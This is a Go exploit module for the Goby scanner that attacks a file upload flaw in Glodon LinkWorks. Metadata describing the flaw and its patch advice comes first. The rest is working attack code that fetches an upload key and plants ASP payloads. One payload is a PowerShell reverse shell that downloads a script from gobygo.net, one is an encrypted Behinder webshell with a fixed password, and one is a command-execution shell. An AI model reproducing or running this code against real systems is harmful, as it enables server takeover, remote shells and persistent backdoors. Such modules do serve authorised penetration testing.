package exploits

import (
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"net/url"
	"regexp"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Glodon linkworks /Services/FileService/userfiles/getauthorizekey.ashx File Upload Vulnerability",
    "Description": "<p>The LinkWorks collaborative work platform is a product developed by Glodon Technology Co., Ltd. </p><p>It mainly provides solutions for collaborative office, process control, communication and other scenarios for enterprises.</p>",
    "Product": "guanglianda-linkworks",
    "Homepage": "https://www.glodon.com/",
    "DisclosureDate": "2023-09-01",
    "PostTime": "2024-03-20",
    "Author": "_白",
    "FofaQuery": "body=\"Services/Identification/login.ashx\" || body=\"\\\"GTPTDT.ASPX\\\"\" || body=\"images/GTP_Infobig.png\" || banner=\"Services/Identification/login.ashx\" || header=\"GTP_IdServer_LangID\"",
    "GobyQuery": "body=\"Services/Identification/login.ashx\" || body=\"\\\"GTPTDT.ASPX\\\"\" || body=\"images/GTP_Infobig.png\" || banner=\"Services/Identification/login.ashx\" || header=\"GTP_IdServer_LangID\"",
    "Level": "3",
    "Impact": "<p>There is a file upload vulnerability in the LinkWorks collaborative office management platform of Glodon Technology Co., Ltd.</p><p>Attackers can exploit vulnerabilities to upload webshells and obtain system privileges.</p>",
    "Recommendation": "<p>1. The manufacturer has currently released related patches, please upgrade the product in time.</p><p>2. Set access policies through security equipment such as firewalls, and establish a whitelist for access.</p><p>3. If not necessary, prohibit public network access to this system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "reverse,webshell,cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "HW-2023",
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.5",
    "Translation": {
        "CN": {
            "Name": "广联达 linkworks /Services/FileService/userfiles/getauthorizekey.ashx 文件上传漏洞",
            "Product": "广联达-Linkworks协同办公管理平台",
            "Description": "<p>LinkWorks协同工作平台是广联达梦龙软件有限公司开发的一款产品，它主要为企业提供协同办公、流程管控、沟通交流等场景的解决方案。</p>",
            "Recommendation": "<p>1、目前厂商已发布相关补丁，及时进行产品升级。</p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>广联达科技股份有限公司LinkWorks协同办公管理平台存在文件上传漏洞。</p><p>攻击者可利用漏洞上传webshell获取系统权限。</p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "HW-2023",
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Glodon linkworks /Services/FileService/userfiles/getauthorizekey.ashx File Upload Vulnerability",
            "Product": "guanglianda-linkworks",
            "Description": "<p>The LinkWorks collaborative work platform is a product developed by Glodon <span style=\"color: rgb(22, 28, 37); font-size: 16px;\">Technology</span> Co., Ltd.&nbsp;</p><p>It mainly provides solutions for collaborative office, process control, communication and other scenarios for enterprises.</p>",
            "Recommendation": "<p>1. The manufacturer has currently released related patches, please upgrade the product in time.</p><p>2. Set access policies through security equipment such as firewalls, and establish a whitelist for access.</p><p>3. If not necessary, prohibit public network access to this system.</p>",
            "Impact": "<p>There is a file upload vulnerability in the LinkWorks collaborative office management platform of Glodon Technology Co., Ltd.</p><p>Attackers can exploit vulnerabilities to upload webshells and obtain system privileges.</p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "HW-2023",
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10967"
}`

	generateRandomStringBVGHERGK := func() string {
		rand.Seed(time.Now().UnixNano())
		const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
		result := make([]byte, 6)
		for i := range result {
			result[i] = charset[rand.Intn(len(charset))]
		}
		return string(result) + ".asp"

	}

	getauthkeyBVGHERGK := func(hostInfo *httpclient.FixUrl, payload string) (*httpclient.HttpResponse, error) {
		paylaodConfig := httpclient.NewPostRequestConfig("/Services/FileService/userfiles/getauthorizekey.ashx")
		paylaodConfig.VerifyTls = false
		paylaodConfig.FollowRedirect = false
		paylaodConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		paylaodConfig.Data = "cmd=&destDir=./sysinfo/&destFilename=" + payload
		return httpclient.DoHttpRequest(hostInfo, paylaodConfig)
	}
	getuploadFlagBVGHERGK := func(hostInfo *httpclient.FixUrl, payload string) (*httpclient.HttpResponse, error) {
		uploadfilepath := "/UserFiles/sysinfo/" + payload
		resultConfig := httpclient.NewGetRequestConfig(uploadfilepath)
		resultConfig.VerifyTls = false
		resultConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, resultConfig)
	}

	checkuploadFlagBVGHERGK := func(hostInfo *httpclient.FixUrl) (bool, error) {
		resp, err := getauthkeyBVGHERGK(hostInfo, "examplecaccc.asp")
		if resp == nil && err != nil {
			return false, err
		} else {
			if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "key") && strings.Contains(resp.Utf8Html, "success") && !strings.Contains(resp.Utf8Html, "not authorized") {
				return true, err
			} else {
				return false, err
			}
		}
	}
	sendpayloadBVGHERGK := func(hostInfo *httpclient.FixUrl, payload string, uploadfile string, filename string) (*httpclient.HttpResponse, error) {
		paylaodConfig := httpclient.NewPostRequestConfig("/Services/FileService/UserFiles/UserFilesUpload.ashx")
		paylaodConfig.VerifyTls = false
		paylaodConfig.FollowRedirect = false
		paylaodConfig.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundarytCOFhbEjc3IfYaY5")
		paylaodConfig.Data = "------WebKitFormBoundarytCOFhbEjc3IfYaY5\nContent-Disposition: form-data; name=\"key\"\n\n" + payload + "\n------WebKitFormBoundarytCOFhbEjc3IfYaY5\nContent-Disposition: form-data; name=\"destDir\"\nContent-Disposition: form-data; name=\"destDir\"\n\n./sysinfo/\n------WebKitFormBoundarytCOFhbEjc3IfYaY5\nContent-Disposition: form-data; name=\"destFilename\"\n\n" + filename + "\n------WebKitFormBoundarytCOFhbEjc3IfYaY5\nContent-Disposition: form-data; name=\"file\";filename=\"" + filename + "\"\ncontent-type:image/png\n\n" + uploadfile + "\n------WebKitFormBoundarytCOFhbEjc3IfYaY5--"
		return httpclient.DoHttpRequest(hostInfo, paylaodConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			success, _ := checkuploadFlagBVGHERGK(hostInfo)
			if success {
				stepLogs.VulURL = hostInfo.FixedHostInfo + "/Services/FileService/UserFiles/UserFilesUpload.ashx"
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			if attackType == "reverse" {
				filename := generateRandomStringBVGHERGK()
				if resp, _ := getauthkeyBVGHERGK(expResult.HostInfo, filename); resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "key") && strings.Contains(resp.Utf8Html, "success") {
					waitSessionCh := make(chan string)
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) == 0 {
						expResult.Output = "godclient bind failed!"
						expResult.Success = false
						return expResult
					} else {
						keyValue := regexp.MustCompile(`key:"([^"]+)"`).FindStringSubmatch(resp.Utf8Html)[1]
						uploadfilecontent := "<% cmd = Request.QueryString(\"cmd\")\nResponse.write CreateObject(\"wscript.shell\").exec(\"cmd.exe /c powershell IEX (New-Object Net.WebClient).DownloadString('https://gobygo.net/ps/rs.ps1');rs -H gobygo.net -P " + rp + "\").StdOut.ReadAll %>\n<% set myfso=server.CreateObject(\"scripting.filesystemobject\")\nmyfso.DeleteFile(server.MapPath(request.ServerVariables(\"Path_Info\")))%>"
						if resp2, _ := sendpayloadBVGHERGK(expResult.HostInfo, keyValue, uploadfilecontent, filename); resp2.StatusCode == 200 {
							_, _ = getuploadFlagBVGHERGK(expResult.HostInfo, filename)
							select {
							case webConsoleID := <-waitSessionCh:
								u, _ := url.Parse(webConsoleID)
								expResult.Success = true
								expResult.OutputType = "html"
								sid := strings.Join(u.Query()["id"], "")
								expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
							case <-time.After(time.Second * 20):
								expResult.Success = false
								expResult.Output = "漏洞利用失败!"
							}
						}
					}
				} else {
					expResult.Success = false
					expResult.Output = "漏洞利用失败！"
				}

			} else if attackType == "webshell" {
				filename := generateRandomStringBVGHERGK()
				if resp, _ := getauthkeyBVGHERGK(expResult.HostInfo, filename); resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "key") && strings.Contains(resp.Utf8Html, "success") {
					keyValue := regexp.MustCompile(`key:"([^"]+)"`).FindStringSubmatch(resp.Utf8Html)[1]
					uploadfilecontent := "<%\nResponse.CharSet = \"UTF-8\" \nk=\"e45e329feb5d925b\"\nSession(\"k\")=k\nsize=Request.TotalBytes\ncontent=Request.BinaryRead(size)\nFor i=1 To size\nresult=result&Chr(ascb(midb(content,i,1)) Xor Asc(Mid(k,(i and 15)+1,1)))\nNext\nexecute(result)%>"
					if resp2, _ := sendpayloadBVGHERGK(expResult.HostInfo, keyValue, uploadfilecontent, filename); resp2.StatusCode == 200 {
						if resp3, _ := getuploadFlagBVGHERGK(expResult.HostInfo, filename); resp3.StatusCode == 200 || resp3.StatusCode == 500 {
							expResult.Success = true
							expResult.Output = "WebShell URL:" + expResult.HostInfo.FixedHostInfo + "/UserFiles/sysinfo/" + filename + "\nPassword:rebeyond\nWebShell tool:Behinder v3.0\nWebshell type: asp"
						}
					} else {
						expResult.Success = false
						expResult.OutputType = "html"
						expResult.Output = resp.Utf8Html
					}
				} else {
					expResult.Success = false
					expResult.OutputType = "html"
					expResult.Output = resp.Utf8Html
				}

			} else if attackType == "cmd" {
				cmd := goutils.B2S(stepLogs.Params["cmd"])
				filename := generateRandomStringBVGHERGK()
				if resp, _ := getauthkeyBVGHERGK(expResult.HostInfo, filename); resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "key") && strings.Contains(resp.Utf8Html, "success") {
					keyValue := regexp.MustCompile(`key:"([^"]+)"`).FindStringSubmatch(resp.Utf8Html)[1]
					uploadfilecontent := "<% cmd = Request.QueryString(\"cmd\")\nResponse.write CreateObject(\"wscript.shell\").exec(\"cmd.exe /c " + cmd + "\").StdOut.ReadAll %>\n<% set myfso=server.CreateObject(\"scripting.filesystemobject\")\nmyfso.DeleteFile(server.MapPath(request.ServerVariables(\"Path_Info\")))%>"
					if resp2, _ := sendpayloadBVGHERGK(expResult.HostInfo, keyValue, uploadfilecontent, filename); resp2.StatusCode == 200 {
						if resp3, _ := getuploadFlagBVGHERGK(expResult.HostInfo, filename); resp3.StatusCode == 200 {
							expResult.Success = true
							expResult.OutputType = "html"
							expResult.Output = resp3.Utf8Html

						} else {
							expResult.Success = false
							expResult.Output = "漏洞利用失败！"
						}
					} else {
						expResult.Success = false
						expResult.OutputType = "html"
						expResult.Output = resp2.Utf8Html
					}
				} else {
					expResult.Success = false
					expResult.OutputType = "html"
					expResult.Output = resp.Utf8Html
				}
			}
			return expResult
		},
	))
}
